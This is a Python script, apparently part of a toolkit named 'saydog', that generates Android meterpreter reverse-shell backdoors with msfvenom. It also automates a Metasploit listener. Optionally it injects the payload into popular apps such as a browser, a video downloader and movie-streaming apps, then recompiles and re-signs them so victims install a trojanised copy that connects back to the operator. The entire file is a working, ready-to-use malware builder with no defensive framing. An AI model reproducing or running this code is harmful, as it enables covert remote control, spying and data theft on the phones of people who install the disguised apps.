import os
import time
import sys
from sys import *

#################### font colors ####################
w="\033[00m"
r="\033[31m"
g="\033[32m"
y="\033[33m"
b="\033[34m"
p="\033[35m"
c="\033[36m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### menu ####################
def menu():
        try:
                print (w+"{"+B+W+" BACKDOOR "+w+"}")
                print ("")
                print ("{1}--- android/meterpreter/reverse_tcp")
                print ("{2}--- android/meterpreter/reverse_http")
                print ("{3}--- android/meterpreter/reverse_https")
                print ("")
                print ("{0}--- Back to main menu")
                print ("")
                main()
        except KeyboardInterrupt:
                sys.exit(1)

#################### main ####################
def main():
        dog = str(input("choose@number:~$ "))
        if dog == "back" or dog == "0" or dog == "00":
                sys.exit(1)
        elif dog == "1" or dog == "01":
                rname = "tcp"
                print ("")
                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                        f = open("backdoor/ip.txt","r")
                        ip = f.readline().strip()
                        print (w+"set LHOST: "+ip)
                        pass
                else:
                        ip = str(input(w+"set LHOST: "))
                        pass
        elif dog == "2" or dog == "02":
                rname = "http"
                print ("")
                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                        f = open("backdoor/ip.txt","r")
                        ip = f.readline().strip()
                        print (w+"set LHOST: "+ip)
                        pass
                else:
                        ip = str(input(w+"set LHOST: "))
                        pass
        elif dog == "3" or dog == "03":
                rname = "https"
                print ("")
                addrs = str(input(w+"Do you want to use you're public address as LHOST? (y/n) "))
                if addrs == "y" or addrs == "Y" or addrs == "yes" or addrs == "Yes" or addrs == "YES":
                        f = open("backdoor/ip.txt","r")
                        ip = f.readline().strip()
                        print (w+"set LHOST: "+ip)
                        pass
                else:
                        ip = str(input(w+"set LHOST: "))
                        pass
        else:
                sys.exit(1)
        port = str(input(w+"set LPORT: "))
        print ("")
        print (b+"[+]"+w+" configurating metasploit payloads")
        payload = "msfvenom -p android/meterpreter/reverse_"+str(rname)+" lhost="+str(ip)+" lport="+str(port)+" --platform android --arch dalvik -o payload.apk"
        print (b+"[+]"+w+" generating backdoor using msfvenom")
        os.system(payload+" &> /dev//null")
        os.system("echo 'use multi/handler' > saydog.rc")
        os.system("echo 'set payload android/meterpreter/reverse_"+rname+"' >> saydog.rc")
        os.system("echo 'set LHOST "+ip+"' >> saydog.rc")
        os.system("echo 'set LPORT "+port+"' >> saydog.rc")
        os.system("echo 'show options' >> saydog.rc")
        print (g+"[+]"+w+" payload successfully generated")
        print ("")
        ask = str(input("Do you want to bind payload.apk into original.apk? (y/n) "))
        if ask == "y" or ask == "Y" or ask == "yes" or ask == "Yes" or ask == "YES":
                print ("")
                print (w+"{"+B+W+"      APP NAME                  DESCRIPTION        "+w+"}")
                print ("")
                print ("    1) UC_Mini.apk             Browser")
                print ("    2) Speed_test.apk          Internet speed test")
                print ("    3) Hackers_keylogger.apk   Android keylogger app")
                print ("    4) Vidmate.apk             Apps store")
                print ("    5) Droid_sqli.apk          Android sql-injection")
                print ("    6) Wps_connect.apk         Wifi password cracker")
                print ("    7) Indoxxi.apk             Streaming movies")
                print ("    8) Layarkaca21.apk         Streaming movies")
                print ("    9) Hackers_keyboard.apk    Keyboard for android")
                print ("   10) Infinite_design.apk     Design apps")
                print ("")
                dog = str(input("choose@number:~$ "))
                if dog == "1" or dog ==  "01":
                        tmp = "UC_Mini"
                        src = "com"
                        pass
                elif dog == "2" or dog == "02":
                        tmp = "Speed_test"
                        src = "pl"
                        pass
                elif dog == "3" or dog == "03":
                        tmp = "Hackers_keylogger"
                        src = "hack"
                elif dog == "4" or dog == "04":
                        tmp = "Vidmate"
                        src = "com"
                        pass
                elif dog == "5" or dog == "05":
                        tmp = "Droid_sqli"
                        src = "net"
                        pass
                elif dog == "6" or dog == "06":
                        tmp = "Wps_connect"
                        src = "com"
                elif dog == "7" or dog == "07":
                        tmp = "Indoxxi"
                        src = "com"
                        pass
                elif dog == "8" or dog == "08":
                        tmp = "Layarkaca21"
                        src = "com"
                        pass
                elif dog == "9" or dog == "09":
                        tmp = "Hackers_keyboard"
                        src = "org"
                elif dog == "10":
                        tmp = "Infinite_design"
                        src = "com"
                        pass
                else:
                        print (w)
                        print (r+"[!]"+w+" invalid options")
                        print (r+"[!]"+w+" file saved as modules/payload.apk")
                        print (w)
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                print ("")
                print (b+"[+]"+w+" using template: "+tmp+".apk")
                print (b+"[+]"+w+" decompiling payload apk using apktool")
                os.system("proot apktool d -f payload.apk &> /dev//null")
                print (b+"[+]"+w+" inject the original apk with metasploit payloads")
                os.system("sleep 3;cp -R backdoor/"+tmp+" tmp/;cp -R payload/smali/com/metasploit tmp/"+tmp+"/"+src)
                print (g+"[+]"+w+" injection succeeded")
                print (b+"[+]"+w+" recompiling original apk using apktool")
                os.system("proot apktool241 b tmp/"+tmp+" -o original.apk &> /dev//null;rm -rf tmp/"+tmp)
                print (b+"[+]"+w+" keystore was created by the author")
                print (b+"[+]"+w+" signing original apk using apksigner")
                os.system("apksigner -p android keystore original.apk "+tmp+"-injected.apk &> /dev//null")
                print (g+"[+]"+w+" signing successfully")
                print ("")
                out = str(input("save file to [ex: /sdcard]: "))
                if out == "" or out == " ":
                        out = "/sdcard"
                        pass
                else:
                        out = out
                        pass
                print ("")
                os.system("mv "+tmp+"-injected.apk "+out)
                os.system("rm -rf payload payload.apk original.apk keystore '?'")
                print (g+"[+]"+w+" file saved as "+out+"/"+tmp+"-injected.apk")
                print ("")
                dog = str(input("Do you want to start listener? (y/n) "))
                if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                        print ("")
                        os.system("msfconsole -r saydog.rc")
                        pass
                else:
                        pass
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)
        else:
                print ("")
                name = str(input("set filename [ex: payload]: "))
                outp = str(input("save file to [ex: /sdcard]: "))
                print ("")
                os.system("mv payload.apk "+outp+"/"+name+".apk")
                print (g+"[+]"+w+" file saved as "+outp+"/"+name+".apk")
                print ("")
                dog = str(input("[ enter ]"))
                if dog == "":
                        sys.exit(0)
                else:
                        sys.exit(0)

if "__main__" == __name__:
    if "--backdoor-generator" in sys.argv:
        menu()
    else:
            os.system("saydog")